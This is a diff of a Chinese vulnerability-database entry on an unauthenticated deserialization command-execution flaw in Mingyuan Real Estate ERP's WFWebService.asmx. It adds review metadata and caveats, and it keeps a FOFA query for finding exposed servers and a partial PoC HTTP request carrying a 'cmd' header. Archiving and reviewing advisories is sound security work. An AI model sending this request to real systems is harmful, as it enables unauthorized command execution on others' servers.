@@ -1,25 +1,66 @@
 ---
-fofa: "title="
 source: "SourByte05/Vulnerability-Wiki-PoC"
+title: "明源地产ERP WFWebService WriteLog反序列化"
+product: "明源地产ERP"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "无版本；.NET DataSet/Workflow gadget依赖"
+prerequisites: "声明未认证"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%98%8E%E6%BA%90%E5%9C%B0%E4%BA%A7/%E6%98%8E%E6%BA%90%E5%9C%B0%E4%BA%A7ERP%20WFWebService.asmx%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
+fofa: "title=\"明源地产ERP\""
+fofa_unverified: "title="
+id: "vw-300c7c08e79aa7474b69ae97"
+entity_id: "ve-300c7c08e79aa7474b69ae97"
+schema_version: "1"
 ---
 
-# 明源地产ERP WFWebService.asmx 反序列化命令执行漏洞
+# 明源地产ERP WFWebService WriteLog反序列化
 
-# 漏洞描述
+## 条目说明
+
+- 对象与具体问题：明源地产ERP；WFWebService WriteLog反序列化
+- 版本、配置及部署条件：无版本；.NET DataSet/Workflow gadget依赖
+- 认证与权限前提：声明未认证
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 大Gzip/Base64为不透明对象；静态解压识别DataSet等类型，但未反编译/执行，不能保证载荷全部行为
+- cmd头与程序集耦合无解释，根因和返回只截图
+- FOFA截断、HTTP无围栏；在野/广影响无出处，缺修复build
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+## 漏洞描述
 
 明源地产ERP WFWebService.asmx 接口处存在反序列化远程代码执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。
 
-# 影响版本
+## 影响版本
 
 明源地产ERP
 
-# **漏洞状态**
+## **漏洞状态**
 
 | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
 |------|-------|-------|------|
-| 是 | 已公开 | 已公开 | 已知 |
+| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |
 
-## 风险等级
+### 风险等级
 
 | 维度 | 评价 |
 |----|----|
@@ -28,12 +69,13 @@ source: "SourByte05/Vulnerability-Wiki-PoC"
 | 攻击者价值 | 高 |
 | 利用难度 | 低 |
 
-# 漏洞复现
+## 漏洞复现
 
 FOFA：title="明源地产ERP"
 
 POC/EXP：
 
+```http
 POST /MyWorkflowManagement/WebService/WFWebService.asmx HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
@@ -49,11 +91,13 @@ cmd: dir
       </WriteLog>
     </soap:Body>
   </soap:Envelope>
+```
+
 
 ![image-20241105212614228](./.resource/明源地产ERPWFWebService.asmx反序列化命令执行漏洞/media/image-20241105212614228.png)
 
 
-# 修复方案
+## 修复方案
 
 关闭互联网暴露面或接口设置访问权限
 
